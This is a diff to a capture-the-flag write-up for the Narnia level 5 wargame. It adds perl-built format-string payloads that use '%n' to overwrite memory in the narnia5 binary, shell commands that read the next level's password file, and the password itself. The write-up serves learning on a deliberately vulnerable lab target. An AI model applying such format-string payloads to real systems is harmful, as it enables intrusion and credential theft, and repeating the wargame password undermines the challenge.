@@ -66,8 +66,47 @@ int main(int argc, char **argv){
 }
 ```
 
+```
+./narnia5 $(perl -e 'print "A"x100')
+```
+
+![](1.png)
+
+Ok, so the main difference between this challenge and the others is that `strcpy()` is not used. Instead, `snprintf()` is used.
+
+But is the `snprintf` function safe? It turns out [not](https://stackoverflow.com/questions/10112984/buffer-overflow-using-snprintf).
+Because it works like `printf` (except for the fact that the user chooses where the output will be printed).
+I already had the opportunity to take advantage of `printf`'s weakness in the [microcorruption](https://github.com/SimchaTeich/Microcorruption/tree/main/11%20-%20Addis%20Ababa) challenge, so as soon as I received the reminder about `%n`, I understood what had to be done:
+
+```
+./narnia5
+```
+
+![](2.png)
+
+```
+./narnia5 $(perl -e 'print "\x30\xd5\xff\xff" . "A"x(500-4) . "%n"')
+```
+
+![](3.png)
+
+```
+./narnia5 $(perl -e 'print "\x30\xd3\xff\xff" . "A"x(500-4) . "%n"')
+```
+```
+id
+```
+```
+whoami
+```
+```
+cat /etc/narnia_pass/narnia6
+```
+
+![](4.png)
+
 
 ## Password for the next level:
 ```
-
+BAV0SUV0iM
 ```
